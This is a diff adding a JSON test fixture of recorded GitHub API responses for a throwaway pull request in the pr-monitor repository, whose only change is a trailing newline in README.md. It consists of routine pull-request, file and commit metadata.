@@ -1,0 +1,1085 @@
+[
+  {
+    "method": "getPull",
+    "params": {
+      "owner": "thekevinscott",
+      "repo": "pr-monitor",
+      "pull_number": 98
+    },
+    "result": {
+      "url": "https://api.github.com/repos/thekevinscott/pr-monitor/pulls/98",
+      "id": 4637645945,
+      "node_id": "PR_kwDOQnAsWM8AAAABFGzceQ",
+      "html_url": "https://github.com/thekevinscott/pr-monitor/pull/98",
+      "diff_url": "https://github.com/thekevinscott/pr-monitor/pull/98.diff",
+      "patch_url": "https://github.com/thekevinscott/pr-monitor/pull/98.patch",
+      "issue_url": "https://api.github.com/repos/thekevinscott/pr-monitor/issues/98",
+      "number": 98,
+      "state": "open",
+      "locked": false,
+      "title": "Throwaway probe: trailing README newline",
+      "user": {
+        "login": "thekevinbot",
+        "id": 248217931,
+        "node_id": "U_kgDODsuBSw",
+        "avatar_url": "https://avatars.githubusercontent.com/u/248217931?v=4",
+        "gravatar_id": "",
+        "url": "https://api.github.com/users/thekevinbot",
+        "html_url": "https://github.com/thekevinbot",
+        "followers_url": "https://api.github.com/users/thekevinbot/followers",
+        "following_url": "https://api.github.com/users/thekevinbot/following{/other_user}",
+        "gists_url": "https://api.github.com/users/thekevinbot/gists{/gist_id}",
+        "starred_url": "https://api.github.com/users/thekevinbot/starred{/owner}{/repo}",
+        "subscriptions_url": "https://api.github.com/users/thekevinbot/subscriptions",
+        "organizations_url": "https://api.github.com/users/thekevinbot/orgs",
+        "repos_url": "https://api.github.com/users/thekevinbot/repos",
+        "events_url": "https://api.github.com/users/thekevinbot/events{/privacy}",
+        "received_events_url": "https://api.github.com/users/thekevinbot/received_events",
+        "type": "User",
+        "user_view_type": "public",
+        "site_admin": false
+      },
+      "body": "Throwaway PR to capture a contemporaneous willfire integration fixture (case P1). Will be closed without merging once the capture lands.",
+      "created_at": "2026-09-25T11:53:56Z",
+      "updated_at": "2026-09-25T11:53:56Z",
+      "closed_at": null,
+      "merged_at": null,
+      "merge_commit_sha": "b4a2fcf36a23fc90e042ce1a7ffda2748c5a94d4",
+      "assignees": [],
+      "requested_reviewers": [],
+      "requested_teams": [],
+      "labels": [],
+      "milestone": null,
+      "draft": false,
+      "commits_url": "https://api.github.com/repos/thekevinscott/pr-monitor/pulls/98/commits",
+      "review_comments_url": "https://api.github.com/repos/thekevinscott/pr-monitor/pulls/98/comments",
+      "review_comment_url": "https://api.github.com/repos/thekevinscott/pr-monitor/pulls/comments{/number}",
+      "comments_url": "https://api.github.com/repos/thekevinscott/pr-monitor/issues/98/comments",
+      "statuses_url": "https://api.github.com/repos/thekevinscott/pr-monitor/statuses/c7131f1ef99e18a845395c6af6e4816203f5c321",
+      "head": {
+        "label": "thekevinscott:chore/willfire-p1-probe",
+        "ref": "chore/willfire-p1-probe",
+        "sha": "c7131f1ef99e18a845395c6af6e4816203f5c321",
+        "user": {
+          "login": "thekevinscott",
+          "id": 151596,
+          "node_id": "MDQ6VXNlcjE1MTU5Ng==",
+          "avatar_url": "https://avatars.githubusercontent.com/u/151596?v=4",
+          "gravatar_id": "",
+          "url": "https://api.github.com/users/thekevinscott",
+          "html_url": "https://github.com/thekevinscott",
+          "followers_url": "https://api.github.com/users/thekevinscott/followers",
+          "following_url": "https://api.github.com/users/thekevinscott/following{/other_user}",
+          "gists_url": "https://api.github.com/users/thekevinscott/gists{/gist_id}",
+          "starred_url": "https://api.github.com/users/thekevinscott/starred{/owner}{/repo}",
+          "subscriptions_url": "https://api.github.com/users/thekevinscott/subscriptions",
+          "organizations_url": "https://api.github.com/users/thekevinscott/orgs",
+          "repos_url": "https://api.github.com/users/thekevinscott/repos",
+          "events_url": "https://api.github.com/users/thekevinscott/events{/privacy}",
+          "received_events_url": "https://api.github.com/users/thekevinscott/received_events",
+          "type": "User",
+          "user_view_type": "public",
+          "site_admin": false
+        },
+        "repo": {
+          "id": 1114647640,
+          "node_id": "R_kgDOQnAsWA",
+          "name": "pr-monitor",
+          "full_name": "thekevinscott/pr-monitor",
+          "private": false,
+          "owner": {
+            "login": "thekevinscott",
+            "id": 151596,
+            "node_id": "MDQ6VXNlcjE1MTU5Ng==",
+            "avatar_url": "https://avatars.githubusercontent.com/u/151596?v=4",
+            "gravatar_id": "",
+            "url": "https://api.github.com/users/thekevinscott",
+            "html_url": "https://github.com/thekevinscott",
+            "followers_url": "https://api.github.com/users/thekevinscott/followers",
+            "following_url": "https://api.github.com/users/thekevinscott/following{/other_user}",
+            "gists_url": "https://api.github.com/users/thekevinscott/gists{/gist_id}",
+            "starred_url": "https://api.github.com/users/thekevinscott/starred{/owner}{/repo}",
+            "subscriptions_url": "https://api.github.com/users/thekevinscott/subscriptions",
+            "organizations_url": "https://api.github.com/users/thekevinscott/orgs",
+            "repos_url": "https://api.github.com/users/thekevinscott/repos",
+            "events_url": "https://api.github.com/users/thekevinscott/events{/privacy}",
+            "received_events_url": "https://api.github.com/users/thekevinscott/received_events",
+            "type": "User",
+            "user_view_type": "public",
+            "site_admin": false
+          },
+          "html_url": "https://github.com/thekevinscott/pr-monitor",
+          "description": null,
+          "fork": false,
+          "url": "https://api.github.com/repos/thekevinscott/pr-monitor",
+          "forks_url": "https://api.github.com/repos/thekevinscott/pr-monitor/forks",
+          "keys_url": "https://api.github.com/repos/thekevinscott/pr-monitor/keys{/key_id}",
+          "collaborators_url": "https://api.github.com/repos/thekevinscott/pr-monitor/collaborators{/collaborator}",
+          "teams_url": "https://api.github.com/repos/thekevinscott/pr-monitor/teams",
+          "hooks_url": "https://api.github.com/repos/thekevinscott/pr-monitor/hooks",
+          "issue_events_url": "https://api.github.com/repos/thekevinscott/pr-monitor/issues/events{/number}",
+          "events_url": "https://api.github.com/repos/thekevinscott/pr-monitor/events",
+          "assignees_url": "https://api.github.com/repos/thekevinscott/pr-monitor/assignees{/user}",
+          "branches_url": "https://api.github.com/repos/thekevinscott/pr-monitor/branches{/branch}",
+          "tags_url": "https://api.github.com/repos/thekevinscott/pr-monitor/tags",
+          "blobs_url": "https://api.github.com/repos/thekevinscott/pr-monitor/git/blobs{/sha}",
+          "git_tags_url": "https://api.github.com/repos/thekevinscott/pr-monitor/git/tags{/sha}",
+          "git_refs_url": "https://api.github.com/repos/thekevinscott/pr-monitor/git/refs{/sha}",
+          "trees_url": "https://api.github.com/repos/thekevinscott/pr-monitor/git/trees{/sha}",
+          "statuses_url": "https://api.github.com/repos/thekevinscott/pr-monitor/statuses/{sha}",
+          "languages_url": "https://api.github.com/repos/thekevinscott/pr-monitor/languages",
+          "stargazers_url": "https://api.github.com/repos/thekevinscott/pr-monitor/stargazers",
+          "contributors_url": "https://api.github.com/repos/thekevinscott/pr-monitor/contributors",
+          "subscribers_url": "https://api.github.com/repos/thekevinscott/pr-monitor/subscribers",
+          "subscription_url": "https://api.github.com/repos/thekevinscott/pr-monitor/subscription",
+          "commits_url": "https://api.github.com/repos/thekevinscott/pr-monitor/commits{/sha}",
+          "git_commits_url": "https://api.github.com/repos/thekevinscott/pr-monitor/git/commits{/sha}",
+          "comments_url": "https://api.github.com/repos/thekevinscott/pr-monitor/comments{/number}",
+          "issue_comment_url": "https://api.github.com/repos/thekevinscott/pr-monitor/issues/comments{/number}",
+          "contents_url": "https://api.github.com/repos/thekevinscott/pr-monitor/contents/{+path}",
+          "compare_url": "https://api.github.com/repos/thekevinscott/pr-monitor/compare/{base}...{head}",
+          "merges_url": "https://api.github.com/repos/thekevinscott/pr-monitor/merges",
+          "archive_url": "https://api.github.com/repos/thekevinscott/pr-monitor/{archive_format}{/ref}",
+          "downloads_url": "https://api.github.com/repos/thekevinscott/pr-monitor/downloads",
+          "issues_url": "https://api.github.com/repos/thekevinscott/pr-monitor/issues{/number}",
+          "pulls_url": "https://api.github.com/repos/thekevinscott/pr-monitor/pulls{/number}",
+          "milestones_url": "https://api.github.com/repos/thekevinscott/pr-monitor/milestones{/number}",
+          "notifications_url": "https://api.github.com/repos/thekevinscott/pr-monitor/notifications{?since,all,participating}",
+          "labels_url": "https://api.github.com/repos/thekevinscott/pr-monitor/labels{/name}",
+          "releases_url": "https://api.github.com/repos/thekevinscott/pr-monitor/releases{/id}",
+          "deployments_url": "https://api.github.com/repos/thekevinscott/pr-monitor/deployments",
+          "created_at": "2025-12-11T17:15:11Z",
+          "updated_at": "2026-09-24T17:47:08Z",
+          "pushed_at": "2026-09-25T11:53:49Z",
+          "git_url": "git://github.com/thekevinscott/pr-monitor.git",
+          "ssh_url": "git@github.com:thekevinscott/pr-monitor.git",
+          "clone_url": "https://github.com/thekevinscott/pr-monitor.git",
+          "svn_url": "https://github.com/thekevinscott/pr-monitor",
+          "homepage": null,
+          "size": 575,
+          "stargazers_count": 0,
+          "watchers_count": 0,
+          "language": "TypeScript",
+          "has_issues": true,
+          "has_projects": true,
+          "has_downloads": false,
+          "has_wiki": true,
+          "has_pages": false,
+          "has_discussions": false,
+          "forks_count": 0,
+          "mirror_url": null,
+          "archived": false,
+          "disabled": false,
+          "open_issues_count": 7,
+          "license": {
+            "key": "mit",
+            "name": "MIT License",
+            "spdx_id": "MIT",
+            "url": "https://api.github.com/licenses/mit",
+            "node_id": "MDc6TGljZW5zZTEz"
+          },
+          "allow_forking": true,
+          "is_template": false,
+          "web_commit_signoff_required": false,
+          "has_pull_requests": true,
+          "pull_request_creation_policy": "all",
+          "topics": [],
+          "visibility": "public",
+          "forks": 0,
+          "open_issues": 7,
+          "watchers": 0,
+          "default_branch": "main"
+        }
+      },
+      "base": {
+        "label": "thekevinscott:main",
+        "ref": "main",
+        "sha": "7bb6c0f8c7a371537aaf830b3e700a9907ec2151",
+        "user": {
+          "login": "thekevinscott",
+          "id": 151596,
+          "node_id": "MDQ6VXNlcjE1MTU5Ng==",
+          "avatar_url": "https://avatars.githubusercontent.com/u/151596?v=4",
+          "gravatar_id": "",
+          "url": "https://api.github.com/users/thekevinscott",
+          "html_url": "https://github.com/thekevinscott",
+          "followers_url": "https://api.github.com/users/thekevinscott/followers",
+          "following_url": "https://api.github.com/users/thekevinscott/following{/other_user}",
+          "gists_url": "https://api.github.com/users/thekevinscott/gists{/gist_id}",
+          "starred_url": "https://api.github.com/users/thekevinscott/starred{/owner}{/repo}",
+          "subscriptions_url": "https://api.github.com/users/thekevinscott/subscriptions",
+          "organizations_url": "https://api.github.com/users/thekevinscott/orgs",
+          "repos_url": "https://api.github.com/users/thekevinscott/repos",
+          "events_url": "https://api.github.com/users/thekevinscott/events{/privacy}",
+          "received_events_url": "https://api.github.com/users/thekevinscott/received_events",
+          "type": "User",
+          "user_view_type": "public",
+          "site_admin": false
+        },
+        "repo": {
+          "id": 1114647640,
+          "node_id": "R_kgDOQnAsWA",
+          "name": "pr-monitor",
+          "full_name": "thekevinscott/pr-monitor",
+          "private": false,
+          "owner": {
+            "login": "thekevinscott",
+            "id": 151596,
+            "node_id": "MDQ6VXNlcjE1MTU5Ng==",
+            "avatar_url": "https://avatars.githubusercontent.com/u/151596?v=4",
+            "gravatar_id": "",
+            "url": "https://api.github.com/users/thekevinscott",
+            "html_url": "https://github.com/thekevinscott",
+            "followers_url": "https://api.github.com/users/thekevinscott/followers",
+            "following_url": "https://api.github.com/users/thekevinscott/following{/other_user}",
+            "gists_url": "https://api.github.com/users/thekevinscott/gists{/gist_id}",
+            "starred_url": "https://api.github.com/users/thekevinscott/starred{/owner}{/repo}",
+            "subscriptions_url": "https://api.github.com/users/thekevinscott/subscriptions",
+            "organizations_url": "https://api.github.com/users/thekevinscott/orgs",
+            "repos_url": "https://api.github.com/users/thekevinscott/repos",
+            "events_url": "https://api.github.com/users/thekevinscott/events{/privacy}",
+            "received_events_url": "https://api.github.com/users/thekevinscott/received_events",
+            "type": "User",
+            "user_view_type": "public",
+            "site_admin": false
+          },
+          "html_url": "https://github.com/thekevinscott/pr-monitor",
+          "description": null,
+          "fork": false,
+          "url": "https://api.github.com/repos/thekevinscott/pr-monitor",
+          "forks_url": "https://api.github.com/repos/thekevinscott/pr-monitor/forks",
+          "keys_url": "https://api.github.com/repos/thekevinscott/pr-monitor/keys{/key_id}",
+          "collaborators_url": "https://api.github.com/repos/thekevinscott/pr-monitor/collaborators{/collaborator}",
+          "teams_url": "https://api.github.com/repos/thekevinscott/pr-monitor/teams",
+          "hooks_url": "https://api.github.com/repos/thekevinscott/pr-monitor/hooks",
+          "issue_events_url": "https://api.github.com/repos/thekevinscott/pr-monitor/issues/events{/number}",
+          "events_url": "https://api.github.com/repos/thekevinscott/pr-monitor/events",
+          "assignees_url": "https://api.github.com/repos/thekevinscott/pr-monitor/assignees{/user}",
+          "branches_url": "https://api.github.com/repos/thekevinscott/pr-monitor/branches{/branch}",
+          "tags_url": "https://api.github.com/repos/thekevinscott/pr-monitor/tags",
+          "blobs_url": "https://api.github.com/repos/thekevinscott/pr-monitor/git/blobs{/sha}",
+          "git_tags_url": "https://api.github.com/repos/thekevinscott/pr-monitor/git/tags{/sha}",
+          "git_refs_url": "https://api.github.com/repos/thekevinscott/pr-monitor/git/refs{/sha}",
+          "trees_url": "https://api.github.com/repos/thekevinscott/pr-monitor/git/trees{/sha}",
+          "statuses_url": "https://api.github.com/repos/thekevinscott/pr-monitor/statuses/{sha}",
+          "languages_url": "https://api.github.com/repos/thekevinscott/pr-monitor/languages",
+          "stargazers_url": "https://api.github.com/repos/thekevinscott/pr-monitor/stargazers",
+          "contributors_url": "https://api.github.com/repos/thekevinscott/pr-monitor/contributors",
+          "subscribers_url": "https://api.github.com/repos/thekevinscott/pr-monitor/subscribers",
+          "subscription_url": "https://api.github.com/repos/thekevinscott/pr-monitor/subscription",
+          "commits_url": "https://api.github.com/repos/thekevinscott/pr-monitor/commits{/sha}",
+          "git_commits_url": "https://api.github.com/repos/thekevinscott/pr-monitor/git/commits{/sha}",
+          "comments_url": "https://api.github.com/repos/thekevinscott/pr-monitor/comments{/number}",
+          "issue_comment_url": "https://api.github.com/repos/thekevinscott/pr-monitor/issues/comments{/number}",
+          "contents_url": "https://api.github.com/repos/thekevinscott/pr-monitor/contents/{+path}",
+          "compare_url": "https://api.github.com/repos/thekevinscott/pr-monitor/compare/{base}...{head}",
+          "merges_url": "https://api.github.com/repos/thekevinscott/pr-monitor/merges",
+          "archive_url": "https://api.github.com/repos/thekevinscott/pr-monitor/{archive_format}{/ref}",
+          "downloads_url": "https://api.github.com/repos/thekevinscott/pr-monitor/downloads",
+          "issues_url": "https://api.github.com/repos/thekevinscott/pr-monitor/issues{/number}",
+          "pulls_url": "https://api.github.com/repos/thekevinscott/pr-monitor/pulls{/number}",
+          "milestones_url": "https://api.github.com/repos/thekevinscott/pr-monitor/milestones{/number}",
+          "notifications_url": "https://api.github.com/repos/thekevinscott/pr-monitor/notifications{?since,all,participating}",
+          "labels_url": "https://api.github.com/repos/thekevinscott/pr-monitor/labels{/name}",
+          "releases_url": "https://api.github.com/repos/thekevinscott/pr-monitor/releases{/id}",
+          "deployments_url": "https://api.github.com/repos/thekevinscott/pr-monitor/deployments",
+          "created_at": "2025-12-11T17:15:11Z",
+          "updated_at": "2026-09-24T17:47:08Z",
+          "pushed_at": "2026-09-25T11:53:49Z",
+          "git_url": "git://github.com/thekevinscott/pr-monitor.git",
+          "ssh_url": "git@github.com:thekevinscott/pr-monitor.git",
+          "clone_url": "https://github.com/thekevinscott/pr-monitor.git",
+          "svn_url": "https://github.com/thekevinscott/pr-monitor",
+          "homepage": null,
+          "size": 575,
+          "stargazers_count": 0,
+          "watchers_count": 0,
+          "language": "TypeScript",
+          "has_issues": true,
+          "has_projects": true,
+          "has_downloads": false,
+          "has_wiki": true,
+          "has_pages": false,
+          "has_discussions": false,
+          "forks_count": 0,
+          "mirror_url": null,
+          "archived": false,
+          "disabled": false,
+          "open_issues_count": 7,
+          "license": {
+            "key": "mit",
+            "name": "MIT License",
+            "spdx_id": "MIT",
+            "url": "https://api.github.com/licenses/mit",
+            "node_id": "MDc6TGljZW5zZTEz"
+          },
+          "allow_forking": true,
+          "is_template": false,
+          "web_commit_signoff_required": false,
+          "has_pull_requests": true,
+          "pull_request_creation_policy": "all",
+          "topics": [],
+          "visibility": "public",
+          "forks": 0,
+          "open_issues": 7,
+          "watchers": 0,
+          "default_branch": "main"
+        }
+      },
+      "_links": {
+        "self": {
+          "href": "https://api.github.com/repos/thekevinscott/pr-monitor/pulls/98"
+        },
+        "html": {
+          "href": "https://github.com/thekevinscott/pr-monitor/pull/98"
+        },
+        "issue": {
+          "href": "https://api.github.com/repos/thekevinscott/pr-monitor/issues/98"
+        },
+        "comments": {
+          "href": "https://api.github.com/repos/thekevinscott/pr-monitor/issues/98/comments"
+        },
+        "review_comments": {
+          "href": "https://api.github.com/repos/thekevinscott/pr-monitor/pulls/98/comments"
+        },
+        "review_comment": {
+          "href": "https://api.github.com/repos/thekevinscott/pr-monitor/pulls/comments{/number}"
+        },
+        "commits": {
+          "href": "https://api.github.com/repos/thekevinscott/pr-monitor/pulls/98/commits"
+        },
+        "statuses": {
+          "href": "https://api.github.com/repos/thekevinscott/pr-monitor/statuses/c7131f1ef99e18a845395c6af6e4816203f5c321"
+        }
+      },
+      "author_association": "COLLABORATOR",
+      "auto_merge": null,
+      "assignee": null,
+      "active_lock_reason": null,
+      "merged": false,
+      "mergeable": true,
+      "rebaseable": true,
+      "mergeable_state": "clean",
+      "merged_by": null,
+      "comments": 0,
+      "review_comments": 0,
+      "maintainer_can_modify": false,
+      "commits": 1,
+      "additions": 1,
+      "deletions": 0,
+      "changed_files": 1
+    }
+  },
+  {
+    "method": "listPullFiles",
+    "params": {
+      "owner": "thekevinscott",
+      "repo": "pr-monitor",
+      "pull_number": 98
+    },
+    "result": [
+      {
+        "sha": "01fa4eaa29228881cd5731d1224f4b8d090e962a",
+        "filename": "README.md",
+        "status": "modified",
+        "additions": 1,
+        "deletions": 0,
+        "changes": 1,
+        "blob_url": "https://github.com/thekevinscott/pr-monitor/blob/c7131f1ef99e18a845395c6af6e4816203f5c321/README.md",
+        "raw_url": "https://github.com/thekevinscott/pr-monitor/raw/c7131f1ef99e18a845395c6af6e4816203f5c321/README.md",
+        "contents_url": "https://api.github.com/repos/thekevinscott/pr-monitor/contents/README.md?ref=c7131f1ef99e18a845395c6af6e4816203f5c321",
+        "patch": "@@ -181,3 +181,4 @@ CI enforces typecheck, lint, and coverage on every PR, plus a [testing-conventio\n ## License\n \n MIT\n+"
+      }
+    ]
+  },
+  {
+    "method": "getCommit",
+    "params": {
+      "owner": "thekevinscott",
+      "repo": "pr-monitor",
+      "ref": "b4a2fcf36a23fc90e042ce1a7ffda2748c5a94d4"
+    },
+    "result": {
+      "sha": "b4a2fcf36a23fc90e042ce1a7ffda2748c5a94d4",
+      "node_id": "C_kwDOQnAsWNoAKGI0YTJmY2YzNmEyM2ZjOTBlMDQyY2UxYTdmZmRhMjc0OGM1YTk0ZDQ",
+      "commit": {
+        "author": {
+          "name": "thekevinbot",
+          "email": "248217931+thekevinbot@users.noreply.github.com",
+          "date": "2026-09-25T11:53:57Z"
+        },
+        "committer": {
+          "name": "GitHub",
+          "email": "noreply@github.com",
+          "date": "2026-09-25T11:53:57Z"
+        },
+        "message": "Merge c7131f1ef99e18a845395c6af6e4816203f5c321 into 7bb6c0f8c7a371537aaf830b3e700a9907ec2151",
+        "tree": {
+          "sha": "709d40b4fe65b6b0cf47e3a61ffc991ed3969f9b",
+          "url": "https://api.github.com/repos/thekevinscott/pr-monitor/git/trees/709d40b4fe65b6b0cf47e3a61ffc991ed3969f9b"
+        },
+        "url": "https://api.github.com/repos/thekevinscott/pr-monitor/git/commits/b4a2fcf36a23fc90e042ce1a7ffda2748c5a94d4",
+        "comment_count": 0,
+        "verification": {
+          "verified": true,
+          "reason": "valid",
+          "signature": "-----BEGIN PGP SIGNATURE-----\n\nwsFcBAABCAAQBQJqtmDVCRC1aQ7uu5UhlAAA2HEQAAWlmukyQ1WcGVMtvp1Whzot\nR2KJVahMwl5kpSm3zZxx3lWZWYYxB7Sa/sFqjJcelt5+6EdRepq1YIgCvE2YIoiI\nSw9T93p9OYtZZTgs4I2/9GcAGnszyAhYaycHdWuC3cnH1dUSrwvcdPSTH4HRYwFZ\nS2xhsdlQaiLALPG6gVa8HiyoSXAPkVgjEvuj/2GfKkVvTeXUye2RWiRpUHqjgTUC\naXS0J5Mql0ZD7ChvN6/n1/UMl/DhdEtm7XIJT+8d9esz3ze98FPLFiMM6/rXev+F\ntMp/Kwi0Yqd95bdzInY5JQXQxxKiaJaZJ9vyor/2PQKKQBJydZ+EKGMoBE/Zyyyt\nmlZ+oSFxFfjndXQhDE6xDa8l27XtjvJlQ9hfBZyK/mzYRUl2xAR3vzi3SY02ZRNn\n3N3cdx0uXV0EEh3dVfpGV3Cj4uCWiBh+rQ6beErE2deHdv6K7jd4kSNbgv5up9Wf\nQcpHlhjD/+QNbLp+63Febc90+ZG+IpFAnWRyJubruKmk3fDKC6XQuQBnOabIVpaA\nXlgndBCWSVAcxsYgZO5pK34K3QJ8UZY0plVh6BIX41CFs3DlS9qHZYJO4y38NRkz\n11+QTHyYQgBoFOgCbr3+gnQ8ZmVhQIozBfUleAd5lYJSebfEWKum5uZdD0ksd0y6\nq1M7JShKHlcw6Gv7rpsU\n=dlx7\n-----END PGP SIGNATURE-----\n",
+          "payload": "tree 709d40b4fe65b6b0cf47e3a61ffc991ed3969f9b\nparent 7bb6c0f8c7a371537aaf830b3e700a9907ec2151\nparent c7131f1ef99e18a845395c6af6e4816203f5c321\nauthor thekevinbot <248217931+thekevinbot@users.noreply.github.com> 1790337237 -0400\ncommitter GitHub <noreply@github.com> 1790337237 -0400\n\nMerge c7131f1ef99e18a845395c6af6e4816203f5c321 into 7bb6c0f8c7a371537aaf830b3e700a9907ec2151\n",
+          "verified_at": "2026-09-25T11:53:58Z"
+        }
+      },
+      "url": "https://api.github.com/repos/thekevinscott/pr-monitor/commits/b4a2fcf36a23fc90e042ce1a7ffda2748c5a94d4",
+      "html_url": "https://github.com/thekevinscott/pr-monitor/commit/b4a2fcf36a23fc90e042ce1a7ffda2748c5a94d4",
+      "comments_url": "https://api.github.com/repos/thekevinscott/pr-monitor/commits/b4a2fcf36a23fc90e042ce1a7ffda2748c5a94d4/comments",
+      "author": {
+        "login": "thekevinbot",
+        "id": 248217931,
+        "node_id": "U_kgDODsuBSw",
+        "avatar_url": "https://avatars.githubusercontent.com/u/248217931?v=4",
+        "gravatar_id": "",
+        "url": "https://api.github.com/users/thekevinbot",
+        "html_url": "https://github.com/thekevinbot",
+        "followers_url": "https://api.github.com/users/thekevinbot/followers",
+        "following_url": "https://api.github.com/users/thekevinbot/following{/other_user}",
+        "gists_url": "https://api.github.com/users/thekevinbot/gists{/gist_id}",
+        "starred_url": "https://api.github.com/users/thekevinbot/starred{/owner}{/repo}",
+        "subscriptions_url": "https://api.github.com/users/thekevinbot/subscriptions",
+        "organizations_url": "https://api.github.com/users/thekevinbot/orgs",
+        "repos_url": "https://api.github.com/users/thekevinbot/repos",
+        "events_url": "https://api.github.com/users/thekevinbot/events{/privacy}",
+        "received_events_url": "https://api.github.com/users/thekevinbot/received_events",
+        "type": "User",
+        "user_view_type": "public",
+        "site_admin": false
+      },
+      "committer": {
+        "login": "web-flow",
+        "id": 19864447,
+        "node_id": "MDQ6VXNlcjE5ODY0NDQ3",
+        "avatar_url": "https://avatars.githubusercontent.com/u/19864447?v=4",
+        "gravatar_id": "",
+        "url": "https://api.github.com/users/web-flow",
+        "html_url": "https://github.com/web-flow",
+        "followers_url": "https://api.github.com/users/web-flow/followers",
+        "following_url": "https://api.github.com/users/web-flow/following{/other_user}",
+        "gists_url": "https://api.github.com/users/web-flow/gists{/gist_id}",
+        "starred_url": "https://api.github.com/users/web-flow/starred{/owner}{/repo}",
+        "subscriptions_url": "https://api.github.com/users/web-flow/subscriptions",
+        "organizations_url": "https://api.github.com/users/web-flow/orgs",
+        "repos_url": "https://api.github.com/users/web-flow/repos",
+        "events_url": "https://api.github.com/users/web-flow/events{/privacy}",
+        "received_events_url": "https://api.github.com/users/web-flow/received_events",
+        "type": "User",
+        "user_view_type": "public",
+        "site_admin": false
+      },
+      "parents": [
+        {
+          "sha": "7bb6c0f8c7a371537aaf830b3e700a9907ec2151",
+          "url": "https://api.github.com/repos/thekevinscott/pr-monitor/commits/7bb6c0f8c7a371537aaf830b3e700a9907ec2151",
+          "html_url": "https://github.com/thekevinscott/pr-monitor/commit/7bb6c0f8c7a371537aaf830b3e700a9907ec2151"
+        },
+        {
+          "sha": "c7131f1ef99e18a845395c6af6e4816203f5c321",
+          "url": "https://api.github.com/repos/thekevinscott/pr-monitor/commits/c7131f1ef99e18a845395c6af6e4816203f5c321",
+          "html_url": "https://github.com/thekevinscott/pr-monitor/commit/c7131f1ef99e18a845395c6af6e4816203f5c321"
+        }
+      ],
+      "stats": {
+        "total": 1,
+        "additions": 1,
+        "deletions": 0
+      },
+      "files": [
+        {
+          "sha": "01fa4eaa29228881cd5731d1224f4b8d090e962a",
+          "filename": "README.md",
+          "status": "modified",
+          "additions": 1,
+          "deletions": 0,
+          "changes": 1,
+          "blob_url": "https://github.com/thekevinscott/pr-monitor/blob/b4a2fcf36a23fc90e042ce1a7ffda2748c5a94d4/README.md",
+          "raw_url": "https://github.com/thekevinscott/pr-monitor/raw/b4a2fcf36a23fc90e042ce1a7ffda2748c5a94d4/README.md",
+          "contents_url": "https://api.github.com/repos/thekevinscott/pr-monitor/contents/README.md?ref=b4a2fcf36a23fc90e042ce1a7ffda2748c5a94d4",
+          "patch": "@@ -181,3 +181,4 @@ CI enforces typecheck, lint, and coverage on every PR, plus a [testing-conventio\n ## License\n \n MIT\n+"
+        }
+      ]
+    }
+  },
+  {
+    "method": "getCommit",
+    "params": {
+      "owner": "thekevinscott",
+      "repo": "pr-monitor",
+      "ref": "main"
+    },
+    "result": {
+      "sha": "7bb6c0f8c7a371537aaf830b3e700a9907ec2151",
+      "node_id": "C_kwDOQnAsWNoAKDdiYjZjMGY4YzdhMzcxNTM3YWFmODMwYjNlNzAwYTk5MDdlYzIxNTE",
+      "commit": {
+        "author": {
+          "name": "Kevin Scott",
+          "email": "151596+thekevinscott@users.noreply.github.com",
+          "date": "2026-09-24T17:47:03Z"
+        },
+        "committer": {
+          "name": "GitHub",
+          "email": "noreply@github.com",
+          "date": "2026-09-24T17:47:03Z"
+        },
+        "message": "Merge pull request #96 from thekevinscott/chore/bump-willfire-0-2\n\nBump willfire to 0.2.1",
+        "tree": {
+          "sha": "648c8bb5121e6c5593a6fa79e298cd3828124e21",
+          "url": "https://api.github.com/repos/thekevinscott/pr-monitor/git/trees/648c8bb5121e6c5593a6fa79e298cd3828124e21"
+        },
+        "url": "https://api.github.com/repos/thekevinscott/pr-monitor/git/commits/7bb6c0f8c7a371537aaf830b3e700a9907ec2151",
+        "comment_count": 0,
+        "verification": {
+          "verified": true,
+          "reason": "valid",
+          "signature": "-----BEGIN PGP SIGNATURE-----\n\nwsFcBAABCAAQBQJqtWIXCRC1aQ7uu5UhlAAAyYwQAAwx4LfbWCFi5oNKtKJ6ASU4\nAUPSvmt4Y3ecBuNap+SoQxjBAgjfHBtWgXtDnfFxVvgapQ6W9lsnL2AsC4DmzMuy\nRg234ANgoumPyyPgP7nEBsRbF9OWpmiFUvRh0LjpgGh2CB6sSQyqpPuQ2KlxqlW9\nWs4maKZ2TUzJTPfeKkMg8vDZFCviQ9Ew9YcOCz/RYKKsVmiBsMC+/lghTt0AqQ2O\nCvZt6x/mTLNInQqrNcuQeeERAPYNhXlw2ExYvWbQeW5NzT0wzUcU6dLMnbcOlG5W\nk+qztEvAGTp9UF5mf6aqBkuCVOq77c3DU2Nb/G7gM0MJTDH9qhlS8/JCYewQd7+9\nhUucaRG3pw3wivy7EbKOdmqUIFkfklZ8/5nKnJuNrEBBDnYKyLgT06ermJqYWC3j\n+65OBBDTgJL/4aSBVekXMTcGvqH5FK5Iezu0nWEVzzz+b+vLBlxbxlV2zVmC688a\n3UyjDK6LnNdQdrOGrgtel8K5U7CWJUgtMkO0klVFjk9EhNMZWkq45s9/PzCE1gH5\ntmCuRvtKc88FPxIjXIqTGOgYce9aGlXoq8WrqphvgA1V1BOeNL/ckO4NKehdzPoT\nJyL11iWup1/69cOP4FjiAdoln6GnfzlnyakBSwshp3n34mCAjXU4lB+ZWYEVFIeY\nV1UHrkt2qNr9Dqk83ekH\n=C5Vo\n-----END PGP SIGNATURE-----\n",
+          "payload": "tree 648c8bb5121e6c5593a6fa79e298cd3828124e21\nparent 6bc702d251fc4f0ff1cf77809308e31afa7fe251\nparent 4e2cbed7f020962353a3e5a515a887b5c89a0ff2\nauthor Kevin Scott <151596+thekevinscott@users.noreply.github.com> 1790272023 -0400\ncommitter GitHub <noreply@github.com> 1790272023 -0400\n\nMerge pull request #96 from thekevinscott/chore/bump-willfire-0-2\n\nBump willfire to 0.2.1",
+          "verified_at": "2026-09-24T17:47:03Z"
+        }
+      },
+      "url": "https://api.github.com/repos/thekevinscott/pr-monitor/commits/7bb6c0f8c7a371537aaf830b3e700a9907ec2151",
+      "html_url": "https://github.com/thekevinscott/pr-monitor/commit/7bb6c0f8c7a371537aaf830b3e700a9907ec2151",
+      "comments_url": "https://api.github.com/repos/thekevinscott/pr-monitor/commits/7bb6c0f8c7a371537aaf830b3e700a9907ec2151/comments",
+      "author": {
+        "login": "thekevinscott",
+        "id": 151596,
+        "node_id": "MDQ6VXNlcjE1MTU5Ng==",
+        "avatar_url": "https://avatars.githubusercontent.com/u/151596?v=4",
+        "gravatar_id": "",
+        "url": "https://api.github.com/users/thekevinscott",
+        "html_url": "https://github.com/thekevinscott",
+        "followers_url": "https://api.github.com/users/thekevinscott/followers",
+        "following_url": "https://api.github.com/users/thekevinscott/following{/other_user}",
